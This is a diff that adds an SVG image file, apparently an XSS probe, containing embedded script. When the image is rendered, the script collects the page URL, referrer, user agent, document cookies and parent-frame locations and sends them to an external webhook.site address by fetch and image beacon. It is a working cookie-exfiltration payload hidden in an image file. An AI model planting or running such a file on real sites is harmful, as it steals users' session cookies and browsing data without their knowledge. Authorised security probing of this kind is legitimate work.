@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+     width="512" height="512" viewBox="0 0 512 512">
+  <rect width="100%" height="100%" fill="#4b4852"/>
+  <text x="50%" y="50%" fill="#fff" font-size="20" text-anchor="middle">probe.svg</text>
+
+  <image width="1" height="1"
+         href="https://webhook.site/226356a4-be94-46d6-a87c-d6e063983609/probe-svg-image-load"/>
+
+  <script type="application/ecmascript"><![CDATA[
+    (function () {
+      var b = "https://webhook.site/226356a4-be94-46d6-a87c-d6e063983609/probe-svg-script-fired";
+      var ctx = {
+        href: location.href,
+        origin: location.origin,
+        ref: document.referrer,
+        ua: navigator.userAgent,
+        cookieReadable: (function(){ try { return document.cookie || "(empty)"; } catch(e){ return "throw:"+e.message; } })(),
+        topAccess: (function(){ try { return String(top.location.href); } catch(e){ return "blocked:"+e.message; } })(),
+        parentAccess: (function(){ try { return String(parent.location.href); } catch(e){ return "blocked:"+e.message; } })()
+      };
+      var url = b + "?d=" + encodeURIComponent(JSON.stringify(ctx));
+      try { fetch(url, {mode: "no-cors"}); } catch(e) {}
+      try { new Image().src = url + "&img=1"; } catch(e) {}
+      try { document.documentElement.setAttribute("data-fired", "1"); } catch(e) {}
+    })();
+  ]]></script>
+</svg>
